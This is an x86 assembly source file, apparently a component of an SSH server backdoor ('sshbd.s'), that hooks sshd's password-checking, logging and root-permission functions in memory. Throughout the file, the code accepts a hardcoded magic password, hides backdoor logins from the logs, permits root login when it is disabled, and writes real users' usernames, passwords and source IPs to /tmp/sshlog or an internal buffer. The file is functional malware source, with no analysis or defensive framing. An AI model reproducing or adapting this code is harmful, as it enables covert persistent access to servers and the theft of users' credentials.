/* ------------
 * sshbd.s v0.8
 * ------------
 * hooks for:
 *   - auth_passwod()
 *   - do_log()
 *   - auth_root_allowed()
 */
.equ sshbd,  __sshbd__
.equ rxhook, __rxhook__
.equ strlen, __strlen__
.equ bcopyz, __bcopyz__

.section .text
.globl _start
_start:
	nop
	nop
	pusha
	/* mmap() */
	xor    %eax, %eax
	xor    %ebx, %ebx
	movb   $0x3, %bl
	shl    $28, %ebx
	mov    $4096, %ecx
	mov    $0x7,  %edx
	mov    $0x22, %esi
	mov    $0xffffffff, %edi
	xor    %ebp, %ebp
	movb   $192, %al
	int    $0x80
	movl   %eax, %edi
	/* bdcopy */
	jmp   sshbd
	bdcopy:
	pop    %esi					/* get address of sshbd */
	movl   $1000, %ecx
	rep    movsb (%esi), (%edi)	/* copy sshbd to mmap()'d region */
	/* mprotect() */
	movl   authpwd, %ebx
	andl   $0xfffff000, %ebx
	movl   $4096, %ecx
	xorl   %edx, %edx
	movb   $0x7, %dl
	xor    %eax, %eax
	movb   $125, %al
	int    $0x80
	movl   dolog, %ebx
	andl   $0xfffff000, %ebx
	movb   $125, %al
	int    $0x80	
	popa
	ret
	nop
	nop
	nop

/*****************
 * auth_password()
 ****************/
__sshbd__:
	call   bdcopy
	push   %ebx
	push   %esi
	push   %edi
	movl   0x14(%esp), %eax
	cmpb   $0x0, (%eax)
	jz     restore
	/* cmp passwd, h0h0 */
	movl   %eax, %esi
	leal   passwd, %edi
    compare:
	lodsb  (%esi), %al
	scasb  (%edi), %al
	jne    1f
	testb  %al, %al
	jne    compare
	xorl   %eax, %eax
	inc    %eax
	movb   $0x01, log
	jmp    end
    1:
    restore:
	/* call hook and restore */
    leal   authpwdjmp, %eax
    leal   authpwdorg, %ebx
    movl   authpwd, %edx
    push   %eax
    push   %ebx
    push   %edx
    call   rxhook
    addl   $0xc, %esp
    test   %eax, %eax
    je     end
logpwd:
    /* log correct passwords */
    movl   0x10(%esp), %eax    /* struct authctxt  */
    movl   0x20(%eax), %esi    /* authctxt->user */
    movl   logptr, %edi
    xorl   %ecx, %ecx
    call   bcopyz
    movb   $0x3a, (%edi)
    inc    %edi
    movl   0x14(%esp), %esi
    call   bcopyz
    movb   $0x3a, (%edi)
    inc    %edi
    movl   getipaddr, %edx
    push   %ecx
    call  *%edx
    pop    %ecx
    movl   %eax, %esi
    call   bcopyz
    movb   $0xa, (%edi)
    addl   $0x3, %ecx
    movl   loglen, %edx
    addl   %ecx, %edx
    movl   %edx, loglen
    movl   logfilepwd, %eax
    test   %eax, %eax
    jne    log2file
    movl   bdrespwd, %eax
    test   %eax, %eax
    jne    log2bd
   	/* write log to file */
log2file:
	xorl   %eax, %eax
	movb   $0x5, %al
	leal   sshlog, %ebx
	movl   $0x442, %ecx
	int    $0x80
	movl   %eax, %ebx
	movl   %ecx, %edx
	movl   logptr, %ecx
	xorl   %eax, %eax
	movb   $0x4, %al
	int    $0x80
	movb   $0x6, %al
	int    $0x80
	jmp    close
    /* write log to bd .data */
log2bd:
    leal   bdpath, %ebx
    movl   $0x2, %ecx
	movb   $0x5, %al
	int    $0x80
    movl   %eax, %ebx
    movl   pwdlogoff, %ecx
    xorl   %edx, %edx
    movb   $19, %al
    int    $0x80
    movl   logptr, %ecx
    movl   loglen, %edx
    xorl   %eax, %eax
    movb   $0x4, %al
    int    $0x80
    close:
    xorl   %eax, %eax
    movb   $0x6, %al
    int    $0x80
    xorl   %eax, %eax
    inc    %eax
    end:
	pop    %edi
	pop    %esi
	pop    %ebx
	ret

/****************
 * do_log() hook
 ***************/
__logbd__:
    push   %ebx
    push   %esi
    push   %edi
    cmpb   $0x1, log
    je     nolog
    leal   dologjmp, %eax
    leal   dologorg, %ebx
    movl   dolog, %edx
    push   %eax
    push   %ebx
    push   %edx
    call   rxhook
    addl   $0xc, %esp
nolog:
    pop    %edi
    pop    %esi
    pop    %ebx
    ret

/********************
 * root() hook
 * - I hate suduoers
 *******************/
__root__:
    push   %ebx
    push   %esi
    push   %edi
    xorl   %eax, %eax
    inc    %eax
    cmpb   $0x1, rooting
    je     allow
    leal   authrootjmp, %eax
    leal   authrootorg, %ebx
    movl   authroot, %edx
    push   %eax
    push   %ebx
    push   %edx
    call   rxhook
    addl   $0xc, %esp 
allow:
    movl   $0x0, rooting
    pop    %edi
    pop    %esi
    pop    %ebx
    ret

/************************
 * rxhook(func, &org, &jmp)
 * %esp+40 - arg3
 * %esp+36 - arg2
 * %esp+32 - arg1
 * %esp+12 - &jmp
 * %esp+8  - &org
 * %esp+4  - function
 * %esp    - retaddr
 ***********************/
__rxhook__:
	movl   0x4(%esp), %edi
	movl   0x8(%esp), %esi
	xorl   %ecx, %ecx
	movb   $0x8, %cl
	rep    movsb (%esi), (%edi)
	movl   40(%esp), %eax
	movl   36(%esp), %ebx
	movl   32(%esp), %ecx
	movl    4(%esp), %edx
	push   %eax
	push   %ebx
	push   %ecx
	call  *%edx
	addl   $0xc, %esp
	movl   0x4(%esp), %edi
	movl   0xc(%esp), %esi
	xorl   %ecx, %ecx
	movb   $0x7, %cl
	rep    movsb (%esi), (%edi)
	ret

/************************
 * bcopynz()
 * %esi - source byte ptr
 * %edi - dest mem ptr
 * %ecx - len copied
 ***********************/
__bcopyz__:
    lodsb  (%esi), %al
    testb  %al, %al
    je     fin
    stosb  %al, (%edi)
    inc    %ecx
    jmp    bcopyz
    fin:
    ret

/**********
 * strlen()
 *********/
__strlen__:
	push   %edi
	xorl   %eax, %eax
	xorl   %ecx, %ecx
	decl   %ecx
	repnz  scasb (%edi), %al
	notl   %ecx
	decl   %ecx
	movl   %ecx, %eax
	pop    %edi
	ret
/********************************************/
/********************************************/
.section .data
/* ******************
 *
 * Function pointers
 *
 ********************/
getipaddr:
	.long 0xc0c010c0
dolog:
	.long 0xc4f414f4
authroot:
	.long 0xdeadbabe
authpwd:
	.long 0x0deadab0
authpwdmm:
	.long 0x0deadab0

/* ******
 *
 * Hooks 
 *
 *******/
/* auth_password() */
authpwdorg:
	.fill 8,1,0xff
authpwdjmp:
	.byte 0xb9,0xff,0xff,0xff,0xff,0xff,0xe1
/* do_log() */
dologorg:
	.fill 8,1,0xff
dologjmp:
	.byte 0xb9,0xff,0xff,0xff,0xff,0xff,0xe1
/* auth_root_allowed() */
authrootorg:
	.fill 8,1,0xff
authrootjmp:
	.byte 0xb9,0xff,0xff,0xff,0xff,0xff,0xe1
	
/* *************
 *
 * Global vars
 *
 **************/
logfilepwd:               /* store passwords in /tmp/sshlog */
    .long 0x00000000
bdrespwd:                 /* store passwords in char pwdlog[] in bd.c */
    .long 0x00000000
pwdlogoff:                /* offset of char pwdlog[2048] in bd.c */
    .long 0x00000000
rooting:                  /* allow us to log in as root when disabled */
    .long 0x00000000
log:                      /* do_log() switch */ 
    .long 0x00000000
logptr:                   /* ptr to pwd log */
    .long 0x30000800
loglen:                   /* current length of pwd log */
    .long 0x00000000

/* ********
 *
 * Strings
 *
 *********/
bdpath:
    .fill 256,1,0xf4     
sshlog:
	.string "/tmp/sshlog"
user:
	.string "root"
passwd:
	.string "h0h0"
